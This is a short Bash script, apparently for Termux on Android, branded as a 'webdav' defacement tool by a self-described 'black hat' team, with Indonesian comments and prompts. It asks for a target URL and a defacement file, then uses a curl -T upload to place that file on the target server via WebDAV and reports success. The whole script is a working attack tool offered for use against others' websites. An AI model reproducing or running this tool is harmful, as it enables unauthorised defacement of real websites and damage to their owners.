#!/usr/bin/bash
# jangan di recode ya
# hargai karya author nya

clear
figlet webdav | lolcat
echo "=======================================" | lolcat
echo "       [+]Author : MR.P5159C[+]" | lolcat
echo "      [+]Team : black hat jombang[+]" | lolcat
echo "      [+]Facebook : gak tau    [+]" | lolcat
echo "========================================" | lolcat
echo ""
echo "script harus di luar memori intrenal" | lolcat
read -p "Mana Target Mu :" Target;
read -p "Script Deface Mu :" Script;
sleep 4
echo "Tunggu Saya lagi Berusaha..........." | lolcat
sleep 2
termux-setup-storage
curl -T /storage/emulated/0/$Script  $Target
echo "succes" | lolcat


